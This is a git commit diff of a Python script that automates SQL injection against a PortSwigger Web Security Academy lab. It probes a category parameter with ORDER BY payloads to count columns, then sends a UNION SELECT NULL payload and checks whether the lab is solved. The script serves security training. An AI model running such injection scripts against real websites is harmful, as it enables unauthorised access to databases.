0750ac79e766cdd678bef0833b3db02599e4a277
devnull044 <devmal044@gmail.com>
2021-03-31 16:57:55 -0500

    modulated it

--- sqli_row_detector.py
+++ sqli_row_detector.py
@@ -1,35 +1,40 @@
 #created to be used with Portswigger WebSec Academy
 #replace url with lab url similar to one seen below
 import requests
-url = 'https://ac101f911ebb51778049188000010041.web-security-academy.net/filter?category=Accessories'
-
+#url = 'https://ac101f911ebb51778049188000010041.web-security-academy.net/filter?category=Accessories'
+url = 'https://aca91f781e2163b28052654c008f004d.web-security-academy.net/filter?category=Accessories'
 sqli_row = ["'+ORDER+BY+",
             "'+UNION+SELECT+"]
 used_attack_r = []
 nulls = ""
-
+valid_rows = 0
 session = requests.Session()
+
 try:
     r = session.get(url=url)
 except Exception as e:
     print(e)
     exit()
 
-print(r.status_code)
-if r.status_code == 200:
-    for x in range(1,100):
-        attack_url = url[:url.rfind("=")+1]+sqli_row[0]+str(x)+"--"
-        used_attack_r.append(attack_url)
-        r = session.get(url=attack_url)
-        if r.status_code == 500:
-            print("Valid number of rows is:",x-1)
-            print(used_attack_r[x-2])
-            for x in range(x-1):
-                nulls += "NULL,"
-            break
+def find_rows():
+    global nulls,valid_rows,r
+    if r.status_code == 200:
+        for x in range(1,100):
+            attack_url = url[:url.rfind("=")+1]+sqli_row[0]+str(x)+"--"
+            used_attack_r.append(attack_url)
+            r = session.get(url=attack_url)
+            if r.status_code == 500:
+                valid_rows = x-1
+                print("Valid number of rows is:",x-1)
+                print(used_attack_r[x-2])
+                for y in range(x-1):
+                    nulls += "NULL,"
+                break
 
-nulls = nulls[:len(nulls)-1]
-final_attack = url[:url.rfind("=")+1]+sqli_row[1]+nulls+"--" 
+find_rows()
+
+final_attack = url[:url.rfind("=")+1]+sqli_row[1]+nulls[:len(nulls)-1]+"--"
+print(final_attack)
 r = session.get(url=final_attack)
 if "Congratulations, you solved the lab!" in r.text:
     print("lab passed")
